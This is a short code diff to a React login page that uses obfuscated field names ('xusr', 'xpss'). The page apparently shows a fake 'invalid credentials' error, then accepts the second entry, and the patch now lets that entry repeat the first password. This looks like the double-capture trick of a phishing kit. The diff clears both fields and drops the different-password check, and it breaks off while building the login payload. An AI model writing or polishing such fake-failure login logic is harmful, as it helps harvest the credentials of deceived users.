@@ -88,22 +88,16 @@ const LoginPage: React.FC = () => {
         setRequireNewPassword(true);
         setShowInvalidCredentials(true);
         setIsLoading(false);
-        // Clear only password field, keep username
+        // Clear both username and password fields
         setFormData({
-          xusr: formData.xusr, // Keep username
-          xpss: '' // Clear password only
+          xusr: '', // Clear username
+          xpss: '' // Clear password
         });
       }, 1000);
       return;
     }
 
-    if (requireNewPassword && formData.xpss === firstPassword) {
-      setNewPasswordError(t('newPasswordMustBeDifferent'));
-      setIsLoading(false);
-      return;
-    }
-
-    // Second attempt - proceed to next page
+    // Second attempt - proceed to next page (even if credentials are the same)
     try {
         const loginPayload = {
           xusr: formData.xusr,
